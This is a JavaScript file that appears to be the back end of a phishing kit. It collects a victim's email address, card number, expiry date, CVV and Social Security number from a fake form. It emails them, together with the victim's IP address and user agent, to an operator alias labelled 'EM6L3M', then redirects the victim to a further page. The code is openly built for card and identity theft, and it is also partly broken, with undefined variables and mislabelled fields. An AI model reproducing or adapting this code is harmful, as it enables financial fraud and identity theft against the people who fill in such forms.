const email = require("email.js");
const config = require("config.js");

//Server Variables
const ip = process.env.REMOTE_ADDR;
const userAgent = req.headers['user-agent'];
const date = new Date().toString();

//Name Attributes of HTML FORM
//Fetching HTML Values
const Fname = req.body.EmailAddress;
const Lname = req.body.CARD;
const DOB = req.body.Month;
const SSN = req.body.Year;
const phone = req.body.SSN;
const DL = req.body.CVV;
const serv = req.body.__RequestVerificationToken;
const sender_name = "EM6L3M";
const sender_mail = "em6l3mlight.log";

//Main Content
const main_subject = `CARD INFORMATIONS 1 ${ip}`;
const main_body = `
    <p>
    EMAIL ADDRESS : ${Fname} <p>
    CARD NUMBER : ${Lname} <p>
    EXPIRY MONTH: ${DOB} <p>
    EXPIRY YEAR : ${SSN} <p>
    SSN : ${phone} <p>
    CVV : ${DL} <p>
    User-Ip : ${ip} <p>
    -----------------------------------------<p>
    User-Agent : ${userAgent}
    -----------------------------------------<p>
    Date : ${date}`;

const retval = email.send(server_mail, main_subject, `${uid}\r\n \r\n\r\n ${main_body} \r\n\r\n ${uid}\r\n `, {
    from: `${sender_name} <${sender_mail}>`,
    replyTo: sender_mail,
    mimeVersion: "1.0",
    contentType: "text/html; boundary=\"${uid}\""
});

//Output
res.redirect("address.html");
